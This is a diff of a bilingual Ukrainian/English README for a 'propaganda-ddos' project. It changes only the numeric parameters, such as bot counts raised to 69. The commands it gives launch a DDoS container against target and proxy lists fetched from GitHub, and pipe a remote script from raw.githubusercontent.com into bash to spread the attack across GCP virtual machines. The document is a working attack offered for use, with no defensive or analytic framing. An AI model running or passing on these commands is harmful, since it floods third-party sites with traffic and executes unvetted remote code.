@@ -1,8 +1,8 @@
 # propaganda-ddos
 
 ```bash
-docker run --restart=always --name=antiprop -d lovefromukraine/antiprop --refresh=30 \
---dnsres=true -- --onlyproxy=false --bots 50 --checkproxy=true \
+docker run --restart=always --name=antiprop -d lovefromukraine/antiprop --refresh=69 \
+--dnsres=true --errcount=69 --onlyproxy=false --bots 69 --checkproxy=true \
 --sites https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/targets.json \
 --proxy https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/proxy.json
 ```
@@ -15,7 +15,7 @@ docker logs antiprop -f
 ### Запуск в GCP vms / Run in GCP vms
 ```bash
 # Дивись файл micro_vms_gcp.sh / Look into micro_vms_gcp.sh
-curl https://raw.githubusercontent.com/meddion/propaganda-ddos/main/micro_vms_gcp.sh | bash -s 50
+curl https://raw.githubusercontent.com/meddion/propaganda-ddos/main/micro_vms_gcp.sh | bash -s 69
 ```
 
 ### Використання / Usage
